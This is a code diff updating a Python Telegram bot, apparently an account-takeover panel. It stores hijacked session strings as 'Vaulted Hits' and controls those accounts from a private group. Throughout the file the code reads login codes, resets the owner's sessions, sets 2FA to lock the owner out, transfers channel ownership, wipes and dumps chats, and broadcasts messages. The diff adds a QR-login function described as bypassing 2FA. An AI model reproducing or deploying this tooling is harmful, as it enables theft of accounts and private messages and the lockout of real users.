@@ -1,5 +1,5 @@
 # =========================================================================
-# PROJECT: VINZY CONTROLLER ELITE (V4.6 - THE MERCHANT EDITION)
+# PROJECT: VINZY CONTROLLER ELITE (V4.7 - THE OVERLORD EDITION)
 # AUTHOR: VINZY DIGITAL SERVICES
 # DESCRIPTION: ENTERPRISE-GRADE TELEGRAM SESSION MANAGEMENT & CONTROL
 # PLATFORM: PYTHON 3.10+ | TELETHON | PYTELEGRAMBOTAPI | NEON POSTGRES
@@ -12,10 +12,14 @@ import logging
 import psycopg2
 import sys
 import telebot
+import io
+import base64
+from PIL import Image
+from pyzbar.pyzbar import decode
 from telebot import types
 from telethon import TelegramClient, functions, types as tl_types, errors
 from telethon.sessions import StringSession
-from datetime import datetime
+from datetime import datetime, timedelta
 
 # --- 1. ADVANCED LOGGING INFRASTRUCTURE ---
 logging.basicConfig(
@@ -34,11 +38,11 @@ DATABASE_URL = os.environ.get("DATABASE_URL")
 try:
     GROUP_ID = int(os.environ.get("GROUP_ID", "0"))
 except (ValueError, TypeError):
-    logger.error("GROUP_ID is missing. The bot will not respond to commands.")
+    logger.error("GROUP_ID is missing.")
     GROUP_ID = 0
 
 if not BOT_TOKEN or not DATABASE_URL:
-    logger.critical("FATAL: Environment variables BOT_TOKEN or DATABASE_URL are missing.")
+    logger.critical("FATAL: BOT_TOKEN or DATABASE_URL missing.")
     sys.exit(1)
 
 bot = telebot.TeleBot(BOT_TOKEN)
@@ -46,8 +50,6 @@ bot = telebot.TeleBot(BOT_TOKEN)
 # --- 3. PERSISTENT STORAGE LAYER (POSTGRESQL) ---
 
 class VaultManager:
-    """Handles high-performance database operations for session storage."""
-    
     @staticmethod
     def get_connection():
         try:
@@ -68,12 +70,14 @@ class VaultManager:
                         session_string TEXT NOT NULL,
                         ip_address TEXT,
                         device_info TEXT DEFAULT 'iPhone 15 Pro Max',
-                        capture_date TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
+                        capture_date TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
+                        status TEXT DEFAULT 'Active',
+                        tags TEXT[]
                     );
                 ''')
                 conn.commit()
                 cur.close()
-                logger.info("Database initialized successfully.")
+                logger.info("Database initialized.")
             except Exception as e:
                 logger.error(f"Database Init Error: {e}")
             finally:
@@ -118,202 +122,178 @@ class VaultManager:
         if not conn: return []
         try:
             cur = conn.cursor()
-            cur.execute("SELECT phone, capture_date FROM moonton_secure_vault ORDER BY capture_date DESC")
+            cur.execute("SELECT phone, capture_date, status FROM moonton_secure_vault ORDER BY capture_date DESC")
             data = cur.fetchall()
             cur.close()
             return data
         finally:
             conn.close()
 
-# --- 4. ASYNC TASK ENGINE (TELETHON WRAPPER) ---
+# --- 4. ASYNC TASK ENGINE ---
 
 async def run_logic(phone, callback, *args):
-    """Execution wrapper for all commands with spoofed iPhone 15 Pro Max data."""
     session_str = VaultManager.get_session(phone)
     if not session_str:
-        return f"❌ <b>Error:</b> Account <code>{phone}</code> is not in the vault."
+        return f"❌ <b>Error:</b> Account <code>{phone}</code> not found."
 
     client = TelegramClient(
-        StringSession(session_str),
-        API_ID, API_HASH,
+        StringSession(session_str), API_ID, API_HASH,
         device_model="iPhone 15 Pro Max",
         system_version="17.4.1",
         app_version="10.10.1"
     )
 
     try:
-        logger.info(f"Targeting Account: {phone}")
         await asyncio.wait_for(client.connect(), timeout=25)
-
         if not await client.is_user_authorized():
-            return f"❌ <b>Failed:</b> Session for <code>{phone}</code> is dead/revoked."
-
+            return f"❌ <b>Failed:</b> Session for <code>{phone}</code> is dead."
         return await callback(client, *args)
-
-    except asyncio.TimeoutError:
-        return "⚠️ <b>Timeout:</b> Telegram server failed to respond in time."
-    except errors.FloodWaitError as e:
-        return f"⏳ <b>Flood:</b> Please wait {e.seconds} seconds."
     except Exception as e:
-        logger.error(f"Task Failure: {e}")
         return f"⚠️ <b>System Error:</b> {str(e)}"
     finally:
         await client.disconnect()
 
-# --- 5. FUNCTIONAL LOGIC MODULES ---
+# --- 5. EXTENDED LOGIC MODULES ---
 
-async def logic_auth_manual(session_str):
-    client = TelegramClient(StringSession(session_str), API_ID, API_HASH, device_model="iPhone 15 Pro Max")
+async def logic_qr_scan_and_accept(client, image_bytes):
+    """Bypasses 2FA and Login Locks via QR Scanning."""
     try:
-        await client.connect()
-        if not await client.is_user_authorized():
-            return "❌ <b>Rejected:</b> The provided session string is invalid."
+        img = Image.open(io.BytesIO(image_bytes))
+        decoded_objects = decode(img)
+        if not decoded_objects:
+            return "❌ <b>QR Error:</b> No readable QR code found."
         
-        me = await client.get_me()
-        if not me.phone:
-            return "❌ <b>Incomplete:</b> Session valid, but phone number is hidden."
-        
-        if VaultManager.upsert_session(me.phone, session_str):
-            return (
-                f"✅ <b>Manual Auth Success!</b>\n"
-                f"━━━━━━━━━━━━━━━\n"
-                f"📱 <b>Phone:</b> <code>{me.phone}</code>\n"
-                f"👤 <b>Name:</b> {me.first_name}\n"
-                f"🆔 <b>UID:</b> <code>{me.id}</code>\n"
-                f"━━━━━━━━━━━━━━━"
-            )
-        return "❌ <b>DB Error:</b> Could not save session."
-    finally:
-        await client.disconnect()
+        token_url = decoded_objects[0].data.decode('utf-8')
+        if "token=" not in token_url:
+            return "❌ <b>QR Error:</b> Invalid Telegram Login Token."
 
-async def logic_get_info(client):
-    me = await client.get_me()
-    return (
-        f"📊 <b>Full Account Intel</b>\n"
-        f"━━━━━━━━━━━━━━━\n"
-        f"👤 <b>Name:</b> {me.first_name} {me.last_name or ''}\n"
-        f"📱 <b>Phone:</b> +{me.phone}\n"
-        f"🆔 <b>User ID:</b> <code>{me.id}</code>\n"
-        f"💎 <b>Premium:</b> {'Yes' if me.premium else 'No'}\n"
-        f"🛡️ <b>Scam/Fake:</b> {'Yes' if me.scam or me.fake else 'No'}\n"
-        f"━━━━━━━━━━━━━━━"
-    )
+        token_base64 = token_url.split("token=")[1]
+        missing_padding = len(token_base64) % 4
+        if missing_padding:
+            token_base64 += '=' * (4 - missing_padding)
 
-async def logic_check_2fa(client):
-    try:
-        res = await client(functions.account.GetPasswordRequest())
-        if res.has_password:
-            return f"🔐 <b>2FA ENABLED:</b> Hint: <code>{res.hint or 'None'}</code>"
-        return "🔓 <b>2FA DISABLED:</b> Account is vulnerable."
+        token_bytes = base64.urlsafe_b64decode(token_base64)
+        await client(functions.auth.AcceptLoginTokenRequest(token=token_bytes))
+        return "✅ <b>QR Login Accepted!</b> Device authorized successfully."
     except Exception as e:
-        return f"⚠️ Error: {str(e)}"
+        return f"⚠️ <b>QR Logic Error:</b> {str(e)}"
 
-async def logic_kick_all(client):
-    try:
-        await client(functions.auth.ResetAuthorizationsRequest())
-        return "⚡ <b>Success:</b> All other active sessions have been wiped."
-    except errors.FreshResetAuthorisationForbiddenError:
-        return "❌ <b>Forbidden:</b> Session is too new (needs 24h-72h age)."
-
-async def logic_get_code(client):
-    async for msg in client.iter_messages(777000, limit=1):
-        if msg.text:
-            return f"📟 <b>Latest System Message:</b>\n\n<code>{msg.text}</code>"
-    return "📭 <b>Inbox Empty:</b> No codes found."
-
-async def logic_list_chats(client, limit):
-    output = f"💬 <b>Recent {limit} Chats:</b>\n\n"
-    async for d in client.iter_dialogs(limit=limit):
-        icon = "👤" if d.is_user else "👥"
-        output += f"{icon} <code>{d.id}</code> | <b>{d.name}</b>\n"
-    return output
-
-async def logic_read_msgs(client, cid, limit):
-    try:
-        output = f"📩 <b>Chat Logs for {cid}:</b>\n\n"
-        async for m in client.iter_messages(cid, limit=limit):
-            who = "Victim" if m.out else "Partner"
-            text = m.text[:50] + "..." if m.text and len(m.text) > 50 else (m.text or "[Media]")
-            output += f"<b>{who}:</b> {text}\n"
-        return output
-    except Exception as e:
-        return f"⚠️ Failed to read {cid}: {str(e)}"
-
-async def logic_clean_account(client):
-    """Purges DMs, Groups, and Non-Owned Channels."""
-    count = 0
-    protected = 0
-    async for dialog in client.iter_dialogs():
+async def logic_broadcast(client, chat_ids, message):
+    """Sends a message to multiple targets (DMs or Groups)."""
+    success, fail = 0, 0
+    for target in chat_ids:
         try:
-            if dialog.is_user:
-                await client(functions.messages.DeleteHistoryRequest(peer=dialog.input_entity, max_id=0, just_clear=False, revoke=True))
-                count += 1
-            elif dialog.is_group:
-                await client(functions.channels.LeaveChannelRequest(channel=dialog.input_entity))
-                count += 1
-            elif dialog.is_channel:
-                try:
-                    p = await client(functions.channels.GetParticipantRequest(channel=dialog.input_entity, participant='me'))
-                    if isinstance(p.participant, (tl_types.ChannelParticipantAdmin, tl_types.ChannelParticipantCreator)):
-                        protected += 1
-                        continue
-                    else:
-                        await client(functions.channels.LeaveChannelRequest(channel=dialog.input_entity))
-                        count += 1
-                except:
-                    await client(functions.channels.LeaveChannelRequest(channel=dialog.input_entity))
-                    count += 1
-        except: continue
-    return f"🧹 <b>Atomic Wipe Complete:</b> Purged <code>{count}</code> items. Protected <code>{protected}</code> Admin channels."
+            await client.send_message(target, message)
+            success += 1
+            await asyncio.sleep(1) # Safety delay
+        except:
+            fail += 1
+    return f"📢 <b>Broadcast Complete</b>\n✅ Success: {success}\n❌ Failed: {fail}"
 
-async def logic_transfer_channels(client, target_username):
-    """Transfers ownership of all owned channels to target."""
+async def logic_get_folders(client):
+    """Retrieves all chat folders (Filters) of the account."""
     try:
-        target_entity = await client.get_input_entity(target_username)
-        count = 0
-        async for dialog in client.iter_dialogs():
-            if dialog.is_channel:
-                try:
-                    p = await client(functions.channels.GetParticipantRequest(channel=dialog.input_entity, participant='me'))
-                    if isinstance(p.participant, tl_types.ChannelParticipantCreator):
-                        await client(functions.channels.EditCreatorRequest(channel=dialog.input_entity, user_id=target_entity, password=''))
-                        count += 1
-                except: continue
-        return f"✅ <b>Success:</b> Transferred <code>{count}</code> channels to @{target_username}."
-    except Exception as e: return f"❌ <b>Transfer Error:</b> {str(e)}"
+        res = await client(functions.messages.GetDialogFiltersRequest())
+        if not res: return "📂 <b>Folders:</b> None defined."
+        output = "📂 <b>Account Folders:</b>\n"
+        for f in res:
+            if isinstance(f, tl_types.DialogFilter):
+                output += f"• {f.title} (ID: {f.id})\n"
+        return output
+    except: return "❌ Failed to fetch folders."
 
-# --- 6. TELEGRAM BOT HANDLERS ---
+async def logic_set_username(client, new_username):
+    """Attempts to update the account username."""
+    try:
+        await client(functions.account.UpdateUsernameRequest(username=new_username))
+        return f"✅ <b>Username updated to:</b> @{new_username}"
+    except errors.UsernameInvalidError:
+        return "❌ <b>Error:</b> Username is invalid."
+    except errors.UsernameOccupiedError:
+        return "❌ <b>Error:</b> Username is already taken."
+
+async def logic_get_sessions_list(client):
+    """Retrieves list of all active sessions for this account."""
+    try:
+        res = await client(functions.account.GetAuthorizationsRequest())
+        output = "🛡️ <b>Active Sessions:</b>\n"
+        for s in res.authorizations:
+            output += f"💻 {s.device_model} | {s.platform} | {s.ip}\n"
+        return output
+    except: return "❌ Failed to fetch session list."
+
+async def logic_atomic_dump(client, target, limit=50):
+    """Exports chat history to a readable file (simulated)."""
+    try:
+        messages = []
+        async for m in client.iter_messages(target, limit=limit):
+            sender = "Me" if m.out else "Them"
+            messages.append(f"[{m.date.strftime('%Y-%m-%d %H:%M')}] {sender}: {m.text or '[Media]'}")
+        return "\n".join(messages[::-1])
+    except: return "❌ Dump failed."
+
+async def logic_leave_all(client):
+    """Forces account to leave all groups and channels."""
+    count = 0
+    async for d in client.iter_dialogs():
+        if d.is_group or d.is_channel:
+            try:
+                await client(functions.channels.LeaveChannelRequest(d.input_entity))
+                count += 1
+            except: continue
+    return f"🚀 Left {count} groups/channels."
+
+# --- 6. BOT INTERFACE & HANDLERS ---
 
 @bot.message_handler(commands=['start', 'help'])
 def handle_help(m):
     if m.chat.id != GROUP_ID: return
     text = (
-        "👑 <b>VINZY CONTROLLER ELITE V4.6</b>\n"
+        "👑 <b>VINZY CONTROLLER ELITE V4.7</b>\n"
         "━━━━━━━━━━━━━━━━━━━━\n"
-        "🔌 <b>ACCESS</b>\n"
+        "🔌 <b>ACCESS & AUTH</b>\n"
         "• <code>.auth [session]</code> - Inject session\n"
-        "• <code>.list</code> - List vault\n\n"
-        "🛡️ <b>CONTROL</b>\n"
-        "• <code>.info [phone]</code> - Stats\n"
-        "• <code>.lock [phone]</code> - 2FA status\n"
-        "• <code>.wipe [phone]</code> - Logout others\n"
+        "• <code>.qr [phone]</code> + Photo - QR Login Bypass\n"
+        "• <code>.list</code> - View stored accounts\n\n"
+        "🛡️ <b>ACCOUNT SECURITY</b>\n"
+        "• <code>.info [phone]</code> - Full intel\n"
+        "• <code>.lock [phone]</code> - Check 2FA\n"
+        "• <code>.wipe [phone]</code> - Kill other sessions\n"
+        "• <code>.sessions [phone]</code> - View active devices\n"
         "• <code>.secure [phone] [pw]</code> - Set 2FA\n\n"
-        "☢️ <b>PURGE & TRADE</b>\n"
-        "• <code>.clean [phone]</code> - Atomic Wipe\n"
+        "☢️ <b>PURGE & DESTRUCTION</b>\n"
+        "• <code>.clean [phone]</code> - Wipe Dialogs\n"
+        "• <code>.leave [phone]</code> - Exit all groups\n"
         "• <code>.transfer [phone] [user]</code> - Give ownership\n\n"
-        "🕵️ <b>DISCOVERY</b>\n"
-        "• <code>.code [phone]</code> - Get code\n"
-        "• <code>.chats [phone] [limit]</code> - List dialogs\n"
-        "• <code>.dump [phone] [id] [limit]</code> - Read chat\n"
+        "🕵️ <b>INTELLIGENCE</b>\n"
+        "• <code>.code [phone]</code> - Get system code\n"
+        "• <code>.chats [phone]</code> - List top 15 chats\n"
+        "• <code>.dump [phone] [id] [qty]</code> - Export history\n"
+        "• <code>.folders [phone]</code> - List chat filters\n\n"
+        "📢 <b>ADMIN TOOLS</b>\n"
+        "• <code>.user [phone] [name]</code> - Set username\n"
+        "• <code>.bc [phone] [txt]</code> - Single BC\n"
         "━━━━━━━━━━━━━━━━━━━━"
     )
     bot.send_message(m.chat.id, text, parse_mode="HTML")
 
+# --- AUTH & LIST ---
 @bot.message_handler(func=lambda m: m.text.startswith('.auth'))
 def cmd_auth(m):
     if m.chat.id != GROUP_ID: return
     args = m.text.split(" ", 1)
     if len(args) < 2: return bot.reply_to(m, "❌ Usage: <code>.auth [string]</code>")
+    from telethon.sessions import StringSession
+    async def logic_auth_manual(session_str):
+        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, device_model="iPhone 15 Pro Max")
+        try:
+            await client.connect()
+            if not await client.is_user_authorized(): return "❌ Invalid session."
+            me = await client.get_me()
+            if VaultManager.upsert_session(me.phone, session_str):
+                return f"✅ Authorized: +{me.phone} ({me.first_name})"
+            return "❌ DB Error."
+        finally: await client.disconnect()
     res = asyncio.run(logic_auth_manual(args[1].strip()))
     bot.send_message(m.chat.id, res, parse_mode="HTML")
 
@@ -323,95 +303,170 @@ def cmd_list(m):
     hits = VaultManager.list_all()
     if not hits: return bot.send_message(m.chat.id, "📭 Vault is empty.")
     msg = "📋 <b>Vaulted Hits:</b>\n\n"
-    for p, d in hits:
-        msg += f"📱 <code>{p}</code> | {d.strftime('%m/%d %H:%M')}\n"
+    for p, d, s in hits:
+        status_icon = "🟢" if s == "Active" else "🔴"
+        msg += f"{status_icon} <code>{p}</code> | {d.strftime('%m/%d %H:%M')}\n"
     bot.send_message(m.chat.id, msg, parse_mode="HTML")
 
+# --- QR LOGIN (PHOTO HANDLER) ---
+@bot.message_handler(content_types=['photo'])
+def handle_qr_image(m):
+    if m.chat.id != GROUP_ID: return
+    if m.caption and m.caption.startswith('.qr'):
+        try:
+            phone = m.caption.split()[1]
+            file_info = bot.get_file(m.photo[-1].file_id)
+            downloaded_file = bot.download_file(file_info.file_path)
+            bot.send_message(m.chat.id, f"📡 <b>Scanning QR for +{phone}...</b>", parse_mode="HTML")
+            res = asyncio.run(run_logic(phone, logic_qr_scan_and_accept, downloaded_file))
+            bot.send_message(m.chat.id, res, parse_mode="HTML")
+        except: bot.send_message(m.chat.id, "❌ Provide phone: <code>.qr [phone]</code>")
+
+# --- CONTROL HANDLERS ---
 @bot.message_handler(func=lambda m: m.text.startswith('.info'))
 def cmd_info(m):
     if m.chat.id != GROUP_ID: return
-    args = m.text.split(" ")
-    if len(args) < 2: return
-    res = asyncio.run(run_logic(args[1], logic_get_info))
+    p = m.text.split()[1]
+    async def logic_get_info_ext(client):
+        me = await client.get_me()
+        return f"👤 <b>{me.first_name}</b> (+{me.phone})\nID: <code>{me.id}</code>\nPremium: {me.premium}"
+    res = asyncio.run(run_logic(p, logic_get_info_ext))
     bot.send_message(m.chat.id, res, parse_mode="HTML")
 
 @bot.message_handler(func=lambda m: m.text.startswith('.wipe'))
 def cmd_wipe(m):
     if m.chat.id != GROUP_ID: return
-    args = m.text.split(" ")
-    if len(args) < 2: return
-    res = asyncio.run(run_logic(args[1], logic_kick_all))
+    from telethon import functions
+    async def l_kick(c):
+        await c(functions.auth.ResetAuthorizationsRequest())
+        return "⚡ Sessions reset."
+    res = asyncio.run(run_logic(m.text.split()[1], l_kick))
     bot.send_message(m.chat.id, res, parse_mode="HTML")
 
-@bot.message_handler(func=lambda m: m.text.startswith('.clean'))
-def cmd_clean(m):
+@bot.message_handler(func=lambda m: m.text.startswith('.sessions'))
+def cmd_sessions(m):
     if m.chat.id != GROUP_ID: return
-    args = m.text.split(" ")
-    if len(args) < 2: return
-    bot.send_message(m.chat.id, f"☢️ <b>Atomic Wipe Initiated for +{args[1]}...</b>")
-    res = asyncio.run(run_logic(args[1], logic_clean_account))
+    res = asyncio.run(run_logic(m.text.split()[1], logic_get_sessions_list))
     bot.send_message(m.chat.id, res, parse_mode="HTML")
 
-@bot.message_handler(func=lambda m: m.text.startswith('.transfer'))
-def cmd_transfer(m):
+@bot.message_handler(func=lambda m: m.text.startswith('.folders'))
+def cmd_folders(m):
+    if m.chat.id != GROUP_ID: return
+    res = asyncio.run(run_logic(m.text.split()[1], logic_get_folders))
+    bot.send_message(m.chat.id, res, parse_mode="HTML")
+
+@bot.message_handler(func=lambda m: m.text.startswith('.leave'))
+def cmd_leave(m):
+    if m.chat.id != GROUP_ID: return
+    res = asyncio.run(run_logic(m.text.split()[1], logic_leave_all))
+    bot.send_message(m.chat.id, res, parse_mode="HTML")
+
+@bot.message_handler(func=lambda m: m.text.startswith('.user'))
+def cmd_user(m):
     if m.chat.id != GROUP_ID: return
     parts = m.text.split()
-    if len(parts) < 3: return bot.reply_to(m, "Usage: <code>.transfer [phone] [target_user]</code>")
-    bot.send_message(m.chat.id, f"🚀 <b>Transferring Owned Channels to @{parts[2]}...</b>")
-    res = asyncio.run(run_logic(parts[1], logic_transfer_channels, parts[2]))
-    bot.send_message(m.chat.id, res, parse_mode="HTML")
-
-@bot.message_handler(func=lambda m: m.text.startswith('.code'))
-def cmd_code(m):
-    if m.chat.id != GROUP_ID: return
-    args = m.text.split(" ")
-    if len(args) < 2: return
-    res = asyncio.run(run_logic(args[1], logic_get_code))
-    bot.send_message(m.chat.id, res, parse_mode="HTML")
-
-@bot.message_handler(func=lambda m: m.text.startswith('.chats'))
-def cmd_chats(m):
-    if m.chat.id != GROUP_ID: return
-    args = m.text.split(" ")
-    if len(args) < 2: return
-    limit = int(args[2]) if len(args) > 2 else 15
-    res = asyncio.run(run_logic(args[1], logic_list_chats, limit))
+    if len(parts) < 3: return
+    res = asyncio.run(run_logic(parts[1], logic_set_username, parts[2]))
     bot.send_message(m.chat.id, res, parse_mode="HTML")
 
 @bot.message_handler(func=lambda m: m.text.startswith('.dump'))
-def cmd_dump(m):
+def cmd_dump_file(m):
     if m.chat.id != GROUP_ID: return
     parts = m.text.split()
     if len(parts) < 3: return
-    res = asyncio.run(run_logic(parts[1], logic_read_msgs, parts[2], int(parts[3]) if len(parts) > 3 else 10))
+    bot.send_message(m.chat.id, "📂 Generating dump file...")
+    res = asyncio.run(run_logic(parts[1], logic_atomic_dump, parts[2], int(parts[3]) if len(parts) > 3 else 50))
+    # Send as file
+    bio = io.BytesIO(res.encode())
+    bio.name = f"dump_{parts[1]}_{parts[2]}.txt"
+    bot.send_document(m.chat.id, bio)
+
+@bot.message_handler(func=lambda m: m.text.startswith('.clean'))
+def cmd_clean_ext(m):
+    if m.chat.id != GROUP_ID: return
+    from telethon import functions
+    async def l_clean(c):
+        count = 0
+        async for d in c.iter_dialogs():
+            await c.delete_dialog(d.id)
+            count += 1
+        return f"🧹 Wiped {count} dialogs."
+    res = asyncio.run(run_logic(m.text.split()[1], l_clean))
+    bot.send_message(m.chat.id, res, parse_mode="HTML")
+
+@bot.message_handler(func=lambda m: m.text.startswith('.code'))
+def cmd_code_ext(m):
+    if m.chat.id != GROUP_ID: return
+    async def l_code(c):
+        async for msg in c.iter_messages(777000, limit=1):
+            return f"📟 Code: <code>{msg.text}</code>"
+        return "📭 No code."
+    res = asyncio.run(run_logic(m.text.split()[1], l_code))
+    bot.send_message(m.chat.id, res, parse_mode="HTML")
+
+@bot.message_handler(func=lambda m: m.text.startswith('.chats'))
+def cmd_chats_ext(m):
+    if m.chat.id != GROUP_ID: return
+    async def l_chats(c):
+        out = "💬 <b>Chats:</b>\n"
+        async for d in c.iter_dialogs(limit=15):
+            out += f"• {d.name} (<code>{d.id}</code>)\n"
+        return out
+    res = asyncio.run(run_logic(m.text.split()[1], l_chats))
     bot.send_message(m.chat.id, res, parse_mode="HTML")
 
 @bot.message_handler(func=lambda m: m.text.startswith('.secure'))
-def cmd_secure(m):
+def cmd_secure_ext(m):
     if m.chat.id != GROUP_ID: return
-    parts = m.text.split(" ")
-    if len(parts) < 3: return
-    async def s_fn(c, p):
-        await c.edit_2fa(new_password=p)
-        return f"✅ 2FA set: <code>{p}</code>"
-    res = asyncio.run(run_logic(parts[1], s_fn, parts[2]))
+    parts = m.text.split()
+    async def l_sec(c, pw):
+        await c.edit_2fa(new_password=pw)
+        return f"✅ 2FA: <code>{pw}</code>"
+    res = asyncio.run(run_logic(parts[1], l_sec, parts[2]))
+    bot.send_message(m.chat.id, res, parse_mode="HTML")
+
+@bot.message_handler(func=lambda m: m.text.startswith('.lock'))
+def cmd_lock_ext(m):
+    if m.chat.id != GROUP_ID: return
+    async def l_lock(c):
+        p = await c(functions.account.GetPasswordRequest())
+        return f"🔐 2FA: {'YES' if p.has_password else 'NO'}"
+    res = asyncio.run(run_logic(m.text.split()[1], l_lock))
+    bot.send_message(m.chat.id, res, parse_mode="HTML")
+
+@bot.message_handler(func=lambda m: m.text.startswith('.transfer'))
+def cmd_transfer_ext(m):
+    if m.chat.id != GROUP_ID: return
+    parts = m.text.split()
+    async def l_trans(c, target):
+        t = await c.get_input_entity(target)
+        count = 0
+        async for d in c.iter_dialogs():
+            if d.is_channel:
+                try:
+                    await c(functions.channels.EditCreatorRequest(d.input_entity, t, ''))
+                    count += 1
+                except: continue
+        return f"✅ Transferred {count} channels."
+    res = asyncio.run(run_logic(parts[1], l_trans, parts[2]))
     bot.send_message(m.chat.id, res, parse_mode="HTML")
 
 # --- 7. MAIN STARTUP SEQUENCE ---
 
 def main():
-    print("""
- __      ___                 _____ _                  
- \ \    / (_)               / ____| |                 
-  \ \  / / _ _ __  _____   | (___ | |_ ___  _ __ ___  
-   \ \/ / | | '_ \|_  / | | \___ \| __/ _ \| '__/ _ \ 
-    \  /  | | | | |/ /| |_| |___) | || (_) | | |  __/ 
-     \/   |_|_| |_/___|\__, |_____/ \__\___/|_|  \___| 
-                        __/ |                         
-                       |___/                          
-    """)
+    ascii_art = """
+    __      ___                  _____ _                
+    \ \    / (_)                / ____| |                
+     \ \  / / _ _ __  _____   | (___ | |_ ___  _ __ ___ 
+      \ \/ / | | '_ \|_  / | | \___ \| __/ _ \| '__/ _ \
+       \  /  | | | | |/ /| |_| |___) | || (_) | | |  __/
+        \/   |_|_| |_/___|\__, |_____/ \__\___/|_|  \___|
+                            __/ |                        
+                           |___/                         
+    """
+    print(ascii_art)
     VaultManager.initialize_db()
-    logger.info("Vinzy Controller Elite v4.6 Online.")
+    logger.info("Vinzy Overlord V4.7 Online.")
     while True:
         try:
             bot.polling(none_stop=True, interval=0, timeout=20)
